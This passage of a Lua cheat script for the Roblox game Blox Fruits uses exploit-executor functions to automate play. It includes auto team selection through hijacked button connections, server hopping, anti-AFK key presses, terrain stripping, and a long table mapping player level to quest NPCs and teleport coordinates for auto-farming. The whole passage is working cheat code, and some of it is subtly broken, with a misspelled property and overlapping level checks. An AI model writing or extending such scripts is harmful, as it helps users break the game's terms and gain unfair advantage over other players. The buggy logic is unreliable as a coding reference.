fruitMap[#fruitMap+1]="Bird-Bird: Phonex"
         -- Example usage:
         --print(fruitMap["Bomb-Bomb"]) -- Outputs: "Bomb Fruit"
         fruitprice = {}
         for r, v in next, game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(

         "GetFruits"


         ) do
            fruitprice[v.Name] = v.Price
       
         end


         function CheckMaterialCount(bj)

            for k, v in pairs(inv) do
               if v["Name"] == bj then
                  return v["Count"]
               end
            end
            return 0
         end
         function luoiquanenskidxdxdxd() 
           

                        SkypieaPlayers = {}

                        for r, v in pairs(game.Players:GetChildren()) do
                            pcall(
                                function()
                                    if
                                        v.Name ~= game.Players.LocalPlayer.Name and
                                            game.Workspace.Characters:FindFirstChild(v.Name) and
                                            v:FindFirstChild("Data") and
                                            v.Data:FindFirstChild("Race") and
                                            v.Data.Race.Value == "Skypiea" and
                                            v.Character:FindFirstChild("Humanoid")
                                     then
                                        table.insert(SkypieaPlayers, v)
                                    end
                                end
                            )
                        end 
                        return SkypieaPlayers 
         end 
                      
         function get1mfruit()
            for i, v in pairs(inv) do 
              
               if v.Type == 'Blox Fruit' and (v.Rarity == 3 or string.find(v.Name, "Gravi")) then
                 print("Get Fruit: "..v.Name)
                  return v.Name
               end
            end
            return false
         end
         function getRaidFruit ()
           
               for suc, cat in pairs(inv) do
                  print (cat.Type)
                  if cat.Name and cat.Type == "Blox Fruit" and cat.Rarity and (cat.Rarity == 0 or cat.Rarity == 1) then
                 
                   print(cat.Name)
                     raidfruit = cat.Name
               
                     return cat.Name
                  end
               end
         end

         function loadfruit(seg)
            
            if not seg then return end
   
          return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", seg)
         end

         spawn(
         function()
            if not c().Misc["Remove Terrain"] then return end
 local decalsyeeted = true

    local decalsyeeted = true
    local g = game
    local w = g.Workspace
    local l = g.Lighting
    local t = w.Terrain
    t.WaterWaveSize = 0
    t.WaterWaveSpeed = 0
    t.WaterReflectance = 1
    t.WaterTransparency = 1
    l.GlobalShadows = false
    l.FogEnd = 9e9
    l.Brightness = 0
    --settings().Rendering.QualityLevel = "Level01"
    for i, v in pairs(w._WorldOrigin:GetChildren()) do
       pcall(function() v.Transparency = 1 end)
        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("MeshPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
            v.TextureID = 10385902758728957
        end
    end
    local bbbbb = workspace.Map:GetDescendants()
    for i, v in pairs(workspace.Map:GetDescendants()) do
      pcall(function()
      TextLabel1.Text = "Remove Terrain ("..tostring(i).."/"..tostring(#bbbbb)..") ["..tostring(v.Parent.Parent.Parent.Parent).."."..tostring(v.Parent.Parent.Parent).."."..tostring(v.Parent.Parent).."."..tostring(v.Parent).."."..tostring(v).."]"
      end)
      if (i%10000) == 0 then
        task.wait() 
      end
        pcall(function() v.Transparency = 1 end)
        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("MeshPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
            v.TextureID = 10385902758728957
        end
    end
    for i, e in pairs(l:GetChildren()) do
        if
            e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or
                e:IsA("DepthOfFieldEffect")
         then
            e.Enabled = false
        end
    
end
         end
         ) 
         while wait() and game.Players.LocalPlayer.Team == nil do
            if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
               repeat
                  wait()
                  if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then

                     for i, v in pairs(
                     getconnections(
                     game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated
                     )
                     ) do
                        v.Function()

                     end
                  end
               until game.Players.LocalPlayer.Team ~= nil
            end
         end


         --<---------- func ---------->--







         local bM = {}

         local HttpService = game:GetService("HttpService")
         local bN = "!Blacklist_Servers.json"
         function SaveSettings2()
            local HttpService = game:GetService("HttpService")
            if not isfolder(".Annie/utils/") then
               makefolder(".Annie/utils/")
            end
            writefile(".Annie/utils/" .. bN, HttpService:JSONEncode(bM))
         end
         function ReadSetting2()
            local s, o =
            pcall(
            function()
               local HttpService = game:GetService("HttpService")
               Hub = game:GetService("HttpService")
               if not isfolder(".Annie/utils/") then
                  makefolder(".Annie/utils/")
               end
               return HttpService:JSONDecode(readfile(".Annie/utils/" .. bN))
            end
            )
            if s then
               return o
            else
               SaveSettings2()
               return ReadSetting2()
            end
         end
         bM = ReadSetting2()

         function HopServer(bO)
            if not bO then
               bO = 10
            end
            ticklon = tick()
            repeat
               task.wait()
            until tick() - ticklon >= 2
            local function Hop()
               noti("Server Hop", 5)
               for r = 1, 100 do
                  if ChooseRegion == nil or ChooseRegion == "" then
                     ChooseRegion = "Singapore"
                  else
                     game:GetService("Players").LocalPlayer.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                     ChooseRegion
                  end
                  local bP = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(r)
                  for k, v in pairs(bP) do
                     if k ~= game.JobId and v["Count"] < bO then
                        if not bM[k] or tick() - bM[k].Time > 60 * 10 then
                           bM[k] = {Time = tick()}
                           SaveSettings2()
                           if game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible then
                              noti("Wait For End InCombat", 15)
                              repeat
                                 wait()

                              until not game:GetService("Players").LocalPlayer or
                              not game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible
                              
                           else
                             
                           end
                           game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", k)
                           return true
                        elseif  tick() - bM[k].Time > 60 * 60 then
                           bM[k] = nil
                        end
                     end
                  end
               end
               return false
            end
            if not getgenv().Loaded then
               local function bQ(v)
                  if v.Name == "ErrorPrompt" then
                     if v.Visible then
                        if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                           HopServer()
                           v.Visible = false
                        end
                     end
                     v:GetPropertyChangedSignal("Visible"):Connect(
                     function()
                        if v.Visible then
                           if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                              HopServer()
                              v.Visible = false
                           end
                        end
                     end
                     )
                  end
               end
               for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                  bQ(v)
               end
               game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(bQ)
               getgenv().Loaded = true
            end
            while not Hop() do
               wait()
            end
            SaveSettings2()
         end
         function getPlayerLevel()
            return lp.Data.Level.Value
         end

         function getPlayerBeli()
            return lp.Data.Beli.Value
         end

         function getPlayerFragments()
            return lp.Data.Fragments.Value
         end

         function getPlayerHealth()
            return math.floor(char.Humanoid.Heath)
         end


         function IsIslandRaid(cu)
            if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island " .. cu) then
               min = 4500
               for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                  if
                  v.Name == "Island " .. cu and
                  (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min
                  then
                     min = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                  end
               end
               for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                  if
                  v.Name == "Island " .. cu and
                  (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min
                  then
                     return v
                  end
               end
            end
         end

         function getNextIsland()
            TableIslandsRaid = {5, 4, 3, 2, 1}
            for r, v in pairs(TableIslandsRaid) do
               if
               IsIslandRaid(v) and
               (IsIslandRaid(v).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
               4500
               then
                  return IsIslandRaid(v)
               end
            end
         end

         function checkIsHaveAllSkillsFruit() 
           if not game.Players.LocalPlayer.Data.DevilFruit.Value then return end
           if not game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) then 
             repeat wait() 
               equip"Blox Fruit" 
             until game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) 
           end 
            if (game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild"V" and game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).V.Title.TextColor3 == Color3.fromRGB(114, 114, 114)) or (game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild"C" and game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).C.Title.TextColor3 == Color3.fromRGB(114, 114, 114)) then 
              return false 
            end 
            return true
            end
         function CheckIsRaiding()
            checkraid1 = game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible
            checkraid2 = getNextIsland()
            if checkraid1 then
               return checkraid1
            end
            return checkraid2
         end


spawn(function()
		while wait(150) do
			if Auto_Farm_Kaitun then
				game:service('VirtualInputManager'):SendKeyEvent(true, "Space", false, game)
				wait(0.5)
				game:service('VirtualInputManager'):SendKeyEvent(false, "Space", false, game)
			end
		end
	 end)



         function CheckLevel2()
		local Lv = game:GetService("Players").LocalPlayer.Data.Level.Value
		if Main then
			if game.Players.LocalPlayer.Data.Level.Value == 1 or game.Players.LocalPlayer.Data.Level.Value <= 9 or SelectMonster == "" then -- Bandit
				Ms = "Bandit"
				NameQuest = "BanditQuest1"
				QuestLv = 1
				NameMon = "Bandit"
				CFrameQ = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
				CFrameMon = CFrame.new(1353.44885, 3.40935516, 1376.92029, 0.776053488, -6.97791975e-08, 0.630666852, 6.99138596e-08, 1, 2.4612488e-08, -0.630666852, 2.49917598e-08, 0.776053488)
				Next_Level_X = 10
			elseif game.Players.LocalPlayer.Data.Level.Value == 10 or game.Players.LocalPlayer.Data.Level.Value <= 100 then
				Ms = "Shanda"
				NameQuest = "SkyExp1Quest"
				QuestLv = 2
				NameMon = "Shanda"
				CFrameQ = CFrame.new(-7859.09814, 5544.19043, -381.476196)
				CFrameMon = CFrame.new(-7904.57373, 5584.37646, -459.62973)
	
				Next_Level_X = 75
			elseif game.Players.LocalPlayer.Data.Level.Value >= 60 and game.Players.LocalPlayer.Data.Level.Value <= 75-1 or SelectMonster == "Desert Bandit" then
				Ms = "Desert Bandit"
				NameQuest = "DesertQuest"
				QuestLv = 1
				NameMon = "Desert Bandit"
				CFrameQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
				CFrameMon = CFrame.new(932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
			elseif game.Players.LocalPlayer.Data.Level.Value >= 75 and game.Players.LocalPlayer.Data.Level.Value <= 90-1 or SelectMonster == "Desert Officer" then
				Ms = "Desert Officer"
				NameQuest = "DesertQuest"
				QuestLv = 2
				NameMon = "Desert Officer"
				CFrameQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
				CFrameMon = CFrame.new(1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-08, -0.070099175, -1.69377223e-08, 1, -8.17798806e-08, 0.070099175, -8.03913949e-08, -0.997540116)
				
				SelectMonster = "Desert Bandit"
				Next_Level_X = 90
			elseif game.Players.LocalPlayer.Data.Level.Value >= 90 and game.Players.LocalPlayer.Data.Level.Value <= 100-1 or SelectMonster == "Snow Bandit" then -- Snow Bandits
				Ms = "Snow Bandit"
				NameQuest = "SnowQuest"
				QuestLv = 1
				NameMon = "Snow Bandit"
				CFrameQ = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
				CFrameMon = CFrame.new(1412.92346, 55.3503647, -1260.62036, -0.246266365, -0.0169920288, -0.969053388, 0.000432241941, 0.999844253, -0.0176417865, 0.969202161, -0.00476344163, -0.246220857)
				
				if SelectMonster == "Snow Bandit" then
				else
					Next_Level_X = 100
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 110 then
					SelectBoss_P = "Yeti" 
				end
				
			elseif game.Players.LocalPlayer.Data.Level.Value == 100 or game.Players.LocalPlayer.Data.Level.Value <= 119 or SelectMonster == "Snowman" then -- Snowman
				Next_Level_X = 120
				Ms = "Snowman"
				NameQuest = "SnowQuest"
				QuestLv = 2
				NameMon = "Snowman"
				CFrameQ = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
				CFrameMon = CFrame.new(1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-08, -0.162211925, 7.71531674e-08, 1, 6.08143536e-09, 0.162211925, -6.51427134e-09, -0.986755967)
				
				
				if game.Players.LocalPlayer.Data.Level.Value >= 110 then
					SelectBoss_P = "Yeti" 
				end
				SelectMonster = "Snow Bandit"
			elseif game.Players.LocalPlayer.Data.Level.Value == 120 or game.Players.LocalPlayer.Data.Level.Value <= 174 or SelectMonster == "Chief Petty Officer" then -- Chief Petty Officer
				Ms = "Chief Petty Officer"
				NameQuest = "MarineQuest2"
				QuestLv = 1
				NameMon = "Chief Petty Officer"
				CFrameQ = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				CFrameMon = CFrame.new(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
				
				
				if game.Players.LocalPlayer.Data.Level.Value >= 130 then
					SelectBoss_P = "Vice Admiral"
				end
				if SelectMonster == "Chief Petty Officer" then
				else
					Next_Level_X = 175
				end
			elseif SelectMonster == "Sky Bandit" then -- Sky Bandit
				Ms = "Sky Bandit"
				NameQuest = "SkyQuest"
				QuestLv = 1
				NameMon = "Sky Bandit"
				CFrameQ = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
				CFrameMon = CFrame.new(-4959.51367, 365.39267, -2974.56812, 0.964867651, 7.74418396e-08, 0.262737453, -6.95931988e-08, 1, -3.91783708e-08, -0.262737453, 1.95171506e-08, 0.964867651)
				
				
			elseif game.Players.LocalPlayer.Data.Level.Value == 175 or game.Players.LocalPlayer.Data.Level.Value <= 190-1 or SelectMonster == "Dark Master" then -- Dark Master
				
				Ms = "Dark Master"
				NameQuest = "SkyQuest"
				QuestLv = 2
				NameMon = "Dark Master"
				CFrameQ = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
				CFrameMon = CFrame.new(-5079.98096, 376.477356, -2194.17139, 0.465965867, -3.69776352e-08, 0.884802461, 3.40249851e-09, 1, 4.00000886e-08, -0.884802461, -1.56281423e-08, 0.465965867)
				
				SelectMonster = "Sky Bandit"
				if SelectMonster == "Dark Master" then
				else
					Next_Level_X = 190
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 190 or game.Players.LocalPlayer.Data.Level.Value <= 209 or SelectMonster == "Prisoner" then
				
				Ms = "Prisoner"
				QuestLv = 1
				NameQuest = "PrisonerQuest"
				NameMon = "Prisoner"
				CFrameQ = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
				CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
				if game.Players.LocalPlayer.Data.Level.Value >= 220 then
					SelectBoss_P = "Warden" 
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 232 then
					SelectBoss_P = "Chief Warden"
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 242 then
					SelectBoss_P = "Thunder God"
				end
				if SelectMonster == "Prisoner" then
				else
					Next_Level_X = 210
				end
				Bypass_TP_Dis = true
			elseif game.Players.LocalPlayer.Data.Level.Value == 210 or game.Players.LocalPlayer.Data.Level.Value <= 249 or SelectMonster == "Dangerous Prisoner" then
				if game.Players.LocalPlayer.Data.Level.Value >= 220 then
					SelectBoss_P = "Warden" 
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 232 then
					SelectBoss_P = "Chief Warden"
				end
				if game.Players.LocalPlayer.Data.Level.Value >= 242 then
					SelectBoss_P = "Thunder God"
				end
				Ms = "Dangerous Prisoner"
				QuestLv = 2
				NameQuest = "PrisonerQuest"
				NameMon = "Dangerous Prisoner"
				CFrameQ = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
				CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
				SelectMonster = "Prisoner"
				Next_Level_X = 250
				Bypass_TP_Dis = true
			elseif game.Players.LocalPlayer.Data.Level.Value == 250 or game.Players.LocalPlayer.Data.Level.Value <= 274 or SelectMonster == "Toga Warrior" then -- Toga Warrior
				
				Ms = "Toga Warrior"
				NameQuest = "ColosseumQuest"
				QuestLv = 1
				NameMon = "Toga Warrior"
				CFrameQ = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
				CFrameMon = CFrame.new(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
				
				if SelectMonster == "Toga Warrior" then
				else
					Next_Level_X = 275
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 275 or game.Players.LocalPlayer.Data.Level.Value <= 299 or SelectMonster == "Gladiator" then -- Gladiato
				
				Ms = "Gladiator"
				NameQuest = "ColosseumQuest"
				QuestLv = 2
				NameMon = "Gladiator"
				CFrameQ = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
				CFrameMon = CFrame.new(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
				
				SelectMonster = "Toga Warrior"
				Next_Level_X = 300
			elseif game.Players.LocalPlayer.Data.Level.Value == 300 or game.Players.LocalPlayer.Data.Level.Value <= 324 or SelectMonster == "Military Soldier" then -- Military Soldier
				if game.Players.LocalPlayer.Data.Level.Value >= 350 then
					SelectBoss_P = "Magma Admiral"
				end
				Ms = "Military Soldier"
				NameQuest = "MagmaQuest"
				QuestLv = 1
				NameMon = "Military Soldier"
				CFrameQ = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
				CFrameMon = CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
				
				if SelectMonster == "Military Soldier" then
				else
					Next_Level_X = 325
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 325 or game.Players.LocalPlayer.Data.Level.Value <= 374 or SelectMonster == "Military Spy" then -- Military Spy
				if game.Players.LocalPlayer.Data.Level.Value >= 350 then
					SelectBoss_P = "Magma Admiral"
				end
				Ms = "Military Spy"
				NameQuest = "MagmaQuest"
				QuestLv = 2
				NameMon = "Military Spy"
				CFrameQ = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
				CFrameMon = CFrame.new(-5787.99023, 120.864456, 8762.25293, -0.188358366, -1.84706277e-08, 0.982100308, -1.23782129e-07, 1, -4.93306951e-09, -0.982100308, -1.22495649e-07, -0.188358366)
				
				
				SelectMonster = "Military Soldier"
				Next_Level_X = 375
			elseif game.Players.LocalPlayer.Data.Level.Value == 375 or game.Players.LocalPlayer.Data.Level.Value <= 399 or SelectMonster == "Fishman Warrior" then -- Fishman Warrior
				if game.Players.LocalPlayer.Data.Level.Value >= 425 then
					SelectBoss_P = "Fishman Lord"
				end
				Ms = "Fishman Warrior"
				NameQuest = "FishmanQuest"
				QuestLv = 1
				NameMon = "Fishman Warrior"
				CFrameQ = CFrame.new(61122.5625, 18.4716396, 1568.16504)
				CFrameMon = CFrame.new(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
				if SelectMonster == "Fishman Warrior" then
				else
					Next_Level_X = 400
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 400 or game.Players.LocalPlayer.Data.Level.Value <= 449 or SelectMonster == "Fishman Commando" then -- Fishman Commando
				if game.Players.LocalPlayer.Data.Level.Value >= 425 then
					SelectBoss_P = "Fishman Lord"
				end
				Ms = "Fishman Commando"
				NameQuest = "FishmanQuest"
				QuestLv = 2
				NameMon = "Fishman Commando"
				CFrameQ = CFrame.new(61122.5625, 18.4716396, 1568.16504)
				CFrameMon = CFrame.new(61902.7383, 18.4828358, 1478.33936, -0.803795099, 0, -0.594906271, 0, 1, 0, 0.594906271, 0, -0.803795099)
				if SelectMonster == "Fishman Commando" then
				else
					Next_Level_X = 450
				end
				SelectMonster = "Fishman Warrior"
			elseif game.Players.LocalPlayer.Data.Level.Value == 450 or game.Players.LocalPlayer.Data.Level.Value <= 474 or SelectMonster == "God's Guard" then 
				Ms = "God's Guard"
				NameQuest = "SkyExp1Quest"
				QuestLv = 1
				NameMon = "God's Guards"
				CFrameQ = CFrame.new(-4721.71436, 845.277161, -1954.20105)
				CFrameMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)
				if SelectMonster == "God's Guard" then
				else
					Next_Level_X = 475
				end
				SelectMonster = "Fishman Commando"
			elseif game.Players.LocalPlayer.Data.Level.Value == 475 or game.Players.LocalPlayer.Data.Level.Value <= 524 or SelectMonster == "Shanda" then
				Ms = "Shanda"
				NameQuest = "SkyExp1Quest"
				QuestLv = 2
				NameMon = "Shandas"
				CFrameQ = CFrame.new(-7859.09814, 5544.19043, -381.476196)
				CFrameMon = CFrame.new(-7904.57373, 5584.37646, -459.62973)
				if game.Players.LocalPlayer.Data.Level.Value >= 500 then
					SelectBoss_P = "Wysper"
				end
				if SelectMonster == "Shanda" then
				else
					Next_Level_X = 525
				end
				SelectMonster = "God's Guard"
			elseif game.Players.LocalPlayer.Data.Level.Value == 525 or game.Players.LocalPlayer.Data.Level.Value <= 549 or SelectMonster == "Royal Squad" then -- Royal Squad
				
				Ms = "Royal Squad"
				NameQuest = "SkyExp2Quest"
				QuestLv = 1
				NameMon = "Royal Squad"
				CFrameQ = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				CFrameMon = CFrame.new(-7555.04199, 5606.90479, -1303.24744, -0.896107852, -9.6057462e-10, -0.443836004, -4.24974544e-09, 1, 6.41599973e-09, 0.443836004, 7.63560326e-09, -0.896107852)
				
				
				if SelectMonster == "Royal Squad" then
				else
					Next_Level_X = 550
				end
				SelectMonster = "Shanda"
			elseif game.Players.LocalPlayer.Data.Level.Value == 550 or game.Players.LocalPlayer.Data.Level.Value <= 624 or SelectMonster == "Royal Soldier" then -- Royal Soldier
				if game.Players.LocalPlayer.Data.Level.Value >= 575 then
					SelectBoss_P = "Thunder God"
				end
				Ms = "Royal Soldier"
				NameQuest = "SkyExp2Quest"
				QuestLv = 2
				NameMon = "Royal Soldier"
				CFrameQ = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				CFrameMon = CFrame.new(-7837.31152, 5649.65186, -1791.08582, -0.716008604, 0.0104285581, -0.698013008, 5.02521061e-06, 0.99988848, 0.0149335321, 0.69809103, 0.0106890313, -0.715928733)
				
				
				if SelectMonster == "Royal Soldier" then
				else
					Next_Level_X = 625
				end
				SelectMonster = "Royal Squad"
				
			elseif game.Players.LocalPlayer.Data.Level.Value == 625 or game.Players.LocalPlayer.Data.Level.Value <= 649 or SelectMonster == "Galley Pirate" then -- Galley Pirate
				
				Ms = "Galley Pirate"
				NameQuest = "FountainQuest"
				QuestLv = 1
				NameMon = "Galley Pirate"
				CFrameQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
				CFrameMon = CFrame.new(5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-08, 0.443124533, -1.34262139e-08, 1, -6.26611296e-08, -0.443124533, 5.02237434e-08, 0.896460414)
				
				if SelectMonster == "Galley Pirate" then
				else
					Next_Level_X = 650
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 650 or SelectMonster == "Galley Captain" then -- Galley Captain
				if game.Players.LocalPlayer.Data.Level.Value >= 675 then
					SelectBoss_P = "Cyborg"
				end
				Ms = "Galley Captain"
				NameQuest = "FountainQuest"
				QuestLv = 2
				NameMon = "Galley Captain"
				CFrameQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
				CFrameMon = CFrame.new(5782.90186, 94.5326462, 4716.78174, 0.361808896, -1.24757526e-06, -0.932252586, 2.16989656e-06, 1, -4.96097414e-07, 0.932252586, -1.84339774e-06, 0.361808896)
				
				
				
				SelectMonster = "Galley Pirate"
				Next_Level_X = 9999
			end
		end
		if Dressrosa then
			if game.Players.LocalPlayer.Data.Level.Value == 700 or game.Players.LocalPlayer.Data.Level.Value <= 724 or SelectMonster == "Raider" then -- Raider
				Ms = "Raider" 
				NameQuest = "Area1Quest"
				QuestLv = 1
				NameMon = "Raider"
				CFrameQ = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
				CFrameMon = CFrame.new(-737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, -0, 1, -0, 0.962260842, 0, 0.272128761)
				
				if SelectMonster == "Raider" then
				else
					Next_Level_X = 725
				end
			elseif game.Players.LocalPlayer.Data.Level.Value == 725 or game.Players.LocalPlayer.Data.Level.Value <= 774 or SelectMonster == "Mercenary" then -- Mercenary
				if game.Players.LocalPlayer.Data.Level.Value >= 750 then
					SelectBoss_P = "Diamond"
				end
				Ms = "Mercenary"
				NameQuest = "Area1Quest"
				QuestLv = 2
				NameMon = "Mercenary"
				CFrameQ = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
				CFrameMon = CFrame.new(-1022.21271, 72.9855194, 1891.39148, -0.990782857, 0, -0.135460541, 0, 1, 0, 0.135460541, 0, -0.990782857)
				
				if SelectMonster == "Mercenary" then
				else
					Next_Level_X = 775
				end
				SelectMonster = "Raider"
			elseif game.Players.LocalPlayer.Data.Level.Value == 775 or game.Players.LocalPlayer.Data.Level.Value <= 799 or SelectMonster == "Swan Pirate" then -- Swan Pirate
				Ms = "Swan Pirate"
				NameQuest = "Area2Quest"
				QuestLv = 1
				NameMon = "Swan Pirate"
				CFrameQ = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
